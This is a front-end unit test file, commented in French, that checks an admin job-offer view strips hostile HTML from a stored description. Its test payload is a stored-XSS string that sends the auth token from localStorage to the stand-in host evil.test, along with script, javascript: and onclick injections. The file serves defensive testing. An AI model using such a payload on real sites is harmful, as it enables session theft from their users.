import { describe, expect, it, vi } from "vitest";
import { render, screen } from "@testing-library/react";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";

import { AdminOfferDetailView } from "@/features/admin/admin-offer-view";
import type { PublicJob } from "@/types/public-job";

const replaceMock = vi.hoisted(() => vi.fn());

vi.mock("next/navigation", () => ({
  useRouter: () => ({ replace: replaceMock }),
  usePathname: () => "/admin/offers/offer-1",
}));

// Axios simulé (et non le module API) : la re-sanitisation de la couche API
// est réellement exécutée — c'est elle qui protège le DOM.
vi.mock("@/lib/api/axios", () => ({
  api: { get: vi.fn(), post: vi.fn(), put: vi.fn(), defaults: { baseURL: "http://api.test" } },
}));

import { api } from "@/lib/api/axios";

const getMock = vi.mocked(api.get);

const OFFER_ID = "offer-1";

/** Charge utile XSS stocké : script, image avec onerror, lien javascript:, onclick. */
const HOSTILE_DESCRIPTION =
  "<p>Legit text</p>" +
  "<script>alert(document.cookie)</script>" +
  '<img src=x onerror="fetch(\'//evil.test/\'+localStorage.getItem(\'linqorbit.auth\'))">' +
  '<a href="javascript:alert(1)">link</a>' +
  '<p onclick="steal()">click</p>';

function publicJob(description: string | null): PublicJob {
  return {
    publicId: "pub-1",
    slug: "backend-engineer",
    title: "Backend Engineer",
    description,
    seniority: "senior",
    requiredExpYear: 5,
    city: "Paris",
    country: "FR",
    companyName: "Acme",
    contractType: "Permanent",
    employmentType: "Full-time",
    workMode: "Hybrid",
    salaryMin: 70000,
    salaryMax: 90000,
    salaryCurrency: "EUR",
    salaryPeriod: "year",
    expiresAt: null,
    skills: [],
    languages: [],
    degreeLabels: [],
    studyFieldLabels: [],
    publishedAt: "2026-10-02T10:00:00",
  };
}

function mockAdminJobOffer(description: string | null) {
  getMock.mockImplementation((url: string) => {
    if (url.includes("/normalized-profile")) {
      return Promise.reject(new Error("404"));
    }
    return Promise.resolve({
      data: {
        id: OFFER_ID,
        status: "published",
        createdAt: "2026-10-01T10:00:00",
        updatedAt: "2026-10-05T10:00:00",
        detail: publicJob(description),
      },
    });
  });
}

function renderOfferDetail() {
  const queryClient = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return render(
    <QueryClientProvider client={queryClient}>
      <AdminOfferDetailView offerId={OFFER_ID} />
    </QueryClientProvider>,
  );
}

describe("console admin — re-sanitisation de la description à la lecture (D108)", () => {
  it("n'injecte aucun HTML actif quand la réponse de l'API est hostile", async () => {
    mockAdminJobOffer(HOSTILE_DESCRIPTION);

    const { container } = renderOfferDetail();

    await screen.findByRole("heading", { name: "Description" });

    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("onerror");
    expect(container.innerHTML).not.toContain("onclick");
    expect(container.innerHTML).not.toContain("javascript:");
    expect(container.innerHTML).not.toContain("localStorage");

    // Le texte utile est conservé : la sanitisation n'est pas un effacement.
    expect(screen.getByText("Legit text")).toBeInTheDocument();
    expect(screen.getByText("click")).toBeInTheDocument();
  });

  it("rend la description légitime telle quelle", async () => {
    mockAdminJobOffer("<p>Build things that scale.</p>");

    renderOfferDetail();

    expect(await screen.findByText("Build things that scale.")).toBeInTheDocument();
  });
});
